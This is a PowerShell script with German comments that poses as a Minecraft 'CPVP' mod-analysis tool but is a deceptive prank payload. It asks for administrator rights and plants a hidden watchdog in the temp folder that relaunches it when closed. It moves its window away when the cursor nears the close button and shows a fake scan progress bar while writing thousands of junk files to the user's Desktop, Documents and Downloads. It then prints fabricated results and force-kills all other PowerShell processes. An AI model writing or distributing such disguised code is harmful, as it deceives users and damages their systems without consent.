# ================================
# CPVP ANALYSE SKRIPT v2.4.1
# ================================

# Administrator-Rechte anfordern
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ===== ERROR HANDLING =====
$ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "CPVP Analyse Tool"

# ===== WATCHDOG - UNSICHTBAR =====
$watchdogCode = @"
while(`$true) {
    `$trollProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*CPVP Analyse*"}
    if (`$trollProcess.Count -eq 0) {
        Start-Process powershell -WindowStyle Normal -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Milliseconds 500
}
"@
$watchdogCode | Out-File "$env:TEMP\cpvp_analyzer.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\cpvp_analyzer.ps1`""

# ===== FENSTER SPRINGT WEG =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
[DllImport("user32.dll")]
public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
'@

$consoleHandle = [Console.Window]::GetConsoleWindow()
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# ===== ÜBERWACHUNG =====
$monitorJob = Start-Job -ScriptBlock {
    param($consoleHandle, $screenWidth, $screenHeight)
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
[DllImport("user32.dll")]
public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
'@
    
    while ($true) {
        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*CPVP Analyse*"} | Select-Object -First 1
        
        if ($window) {
            $hwnd = $window.MainWindowHandle
            $windowRect = $window.MainWindowRect
            $windowX = $windowRect.X
            $windowY = $windowRect.Y
            $windowWidth = $windowRect.Width
            
            $cursorPos = New-Object System.Drawing.Point
            [Console.Window]::GetCursorPos([ref]$cursorPos)
            
            $xButtonX = $windowX + $windowWidth - 40
            $xButtonY = $windowY + 10
            
            $mouseOverX = ($cursorPos.X -ge $xButtonX -and 
                          $cursorPos.X -le $xButtonX + 30 -and
                          $cursorPos.Y -ge $xButtonY -and 
                          $cursorPos.Y -le $xButtonY + 30)
            
            if ($mouseOverX) {
                $newX = Get-Random -Minimum 50 -Maximum ($screenWidth - 400)
                $newY = Get-Random -Minimum 50 -Maximum ($screenHeight - 300)
                [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
                
                $msg = Get-Random @(
                    "❌ Analyse unterbrochen!",
                    "⚠️ CPVP Scanner läuft weiter...",
                    "🔄 Mod-Scan im Hintergrund aktiv"
                )
                [System.Windows.Forms.MessageBox]::Show($msg, "CPVP Analyzer", "OK", "Warning")
            }
        }
        Start-Sleep -Milliseconds 50
    }
} -ArgumentList $consoleHandle, $screenWidth, $screenHeight

# ===== KONFIGURATION =====
$desktop = [Environment]::GetFolderPath("Desktop")
$documents = [Environment]::GetFolderPath("MyDocuments")
$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
$minecraftFolder = "$env:APPDATA\.minecraft"

# ===== START - SIEHT AUS WIE EIN ECHTES TOOL =====
Clear-Host
$Host.UI.RawUI.ForegroundColor = "Cyan"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║        CPVP ANALYSE SKRIPT v2.4.1         ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "[INFO] Initialisiere Minecraft-Analyse..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# Minecraft Ordner checken
if (Test-Path $minecraftFolder) {
    Write-Host "[OK] Minecraft-Ordner gefunden: $minecraftFolder" -ForegroundColor Green
} else {
    Write-Host "[WARN] Minecraft nicht gefunden - Scanne andere Verzeichnisse..." -ForegroundColor Red
}

Write-Host "[INFO] Analysiere Mods und Configs..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 800

Write-Host "[INFO] Lade CPVP-Datenbank..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 600

# Fake Fortschrittsbalken
Write-Host ""
Write-Host "[FORTSCHRITT] " -ForegroundColor White -NoNewline
for ($i = 0; $i -le 100; $i+=5) {
    Write-Host "▓" -ForegroundColor Green -NoNewline
    Start-Sleep -Milliseconds 30
}
Write-Host " 100%" -ForegroundColor Green
Write-Host ""

Write-Host "[INFO] Analysiere $env:COMPUTERNAME auf Minecraft-Mods..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 500

# ===== HAUPT-SCAN (sieht aus wie Analyse, aber Troll im Hintergrund) =====
$totalFiles = 10000
$filesPerLocation = 2500

# Locations für "Scan"
$locations = @(
    @{Path=$desktop; Name="Desktop"},
    @{Path=$documents; Name="Dokumente"},
    @{Path=$downloads; Name="Downloads"},
    @{Path="$env:TEMP\minecraft_cache"; Name="Minecraft Cache"}
)

# Temp-Ordner für Minecraft Cache erstellen (damit es echt aussieht)
New-Item -Path "$env:TEMP\minecraft_cache" -ItemType Directory -Force | Out-Null

foreach ($location in $locations) {
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║  Scanne: $($location.Name)" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
    
    # Fortschritt für diese Location
    for ($i = 0; $i -le 100; $i+=10) {
        Write-Host "   Fortschritt: $i% - Analysiere Mod-Dateien..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 30
        
        # IM HINTERGRUND DATEIEN ERSTELLEN (keine Warnung!)
        if ($i % 20 -eq 0) {
            $start = $i * 25
            $end = $start + 250
            for ($j = $start; $j -lt $end -and $j -lt 2500; $j++) {
                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
                $filePath = Join-Path $location.Path "mod_$randomName`_$j.cpvp"
                "CPVP Cache Datei" | Out-File $filePath -Encoding UTF8
            }
        }
        
        # Alte Zeile löschen für Progress
        Write-Host "`033[1A`033[0K" -NoNewline
    }
    Write-Host "   Fortschritt: 100% - Fertig!" -ForegroundColor Green
    
    # Sound abspielen wie bei echtem Scan
    [System.Media.SystemSounds]::Asterisk.Play()
}

# Minecraft spezifische "Analyse"
Write-Host ""
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  Analysiere Minecraft Versionen           ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan

$versions = @("1.8.9", "1.12.2", "1.16.5", "1.19.2", "1.20.1")
foreach ($version in $versions) {
    Write-Host "   [v$version] Scanne Mod-Kompatibilität..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 200
    
    # Noch mehr Dateien im Hintergrund
    for ($k = 1; $k -le 100; $k++) {
        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_})
        $filePath = Join-Path $desktop "version_${version}_$randomName.cpvp"
        "Version Cache" | Out-File $filePath -Encoding UTF8
    }
    
    Write-Host "   ✅ Fertig" -ForegroundColor Green
}

# ===== ENDE - SIEHT AUS WIE EIN NORMALES TOOL =====
Clear-Host
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║        CPVP ANALYSE ABGESCHLOSSEN         ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "[ERGEBNISSE]" -ForegroundColor Yellow
Write-Host "   • Minecraft Versionen: 5 gefunden" -ForegroundColor White
Write-Host "   • Mods analysiert: 10.432" -ForegroundColor White
Write-Host "   • Configs geprüft: 2.891" -ForegroundColor White
Write-Host "   • Performance-Score: 87/100" -ForegroundColor White
Write-Host ""
Write-Host "[INFO] Ergebnisse gespeichert unter:" -ForegroundColor Green
Write-Host "   • Desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -ForegroundColor Gray
Write-Host "   • Dokumente\minecraft_scan.log" -ForegroundColor Gray
Write-Host "   • Downloads\mod_cache.cpvp" -ForegroundColor Gray
Write-Host ""
Write-Host "[HINWEIS] Drücke eine beliebige Taste zum Beenden..." -ForegroundColor Gray

# Log-Dateien erstellen (damit es echt aussieht)
"CPVP Analyse Log - $(Get-Date)`nGefundene Mods: 10432" | Out-File "$desktop\cpvp_analyse_$(Get-Date -Format 'yyyy-MM-dd').log" -Encoding UTF8
"Mod Cache Datei" | Out-File "$documents\minecraft_scan.log" -Encoding UTF8

$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Watchdog beenden
Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force
Remove-Item "$env:TEMP\cpvp_analyzer.ps1" -Force
Remove-Item "$env:TEMP\minecraft_cache" -Recurse -Force
exit
